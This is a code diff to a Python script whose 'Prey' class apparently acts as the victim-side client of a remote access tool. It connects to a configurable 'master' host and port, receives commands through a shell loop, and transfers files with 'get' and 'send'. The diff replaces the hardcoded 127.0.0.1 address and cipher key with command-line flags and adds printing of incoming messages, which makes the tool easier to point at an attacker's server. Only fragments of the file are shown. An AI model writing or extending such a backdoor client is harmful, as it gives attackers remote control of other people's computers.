@@ -4,6 +4,7 @@ from crypt import Vigenere as v
 from time import sleep
 from sys import argv
 from os import chdir, getcwd
+from optparse import OptionParser as op
 from subprocess import PIPE
 from subprocess import Popen as popen
 class Prey:
@@ -17,6 +18,7 @@ class Prey:
 	def shell(self):
 		msj = self.recv();
 		while(msj):
+			print(msj);
 			if(msj[:3] == "get" or msj[:4] == "send"):
 				print("!");
 				b = False;
@@ -89,7 +91,11 @@ class Prey:
 			self.send("The file was sended succesfully!");
 
 def main():
-	p = Prey("127.0.0.1", 5000,"eajlkwbcpqynvhigdrzotusfmx");
-
+	oP = op("Usage: %prog [flags] [args]");
+	oP.add_option("-H", "--host", dest="ip",type="str", default="127.0.0.1", help="Set master's ip.");
+	oP.add_option("-p","--port",dest="port",  type="int", default=5000, help="Set master's port");
+	oP.add_option("-k","--key", type="str", dest="key", default="eajlkwbcpqynvhigdrzotusfmx", help="Set cryptography key");
+	(o, argv) = oP.parse_args();
+	p = Prey(o.ip, o.port, o.key);
 if __name__ == '__main__':
 	main();
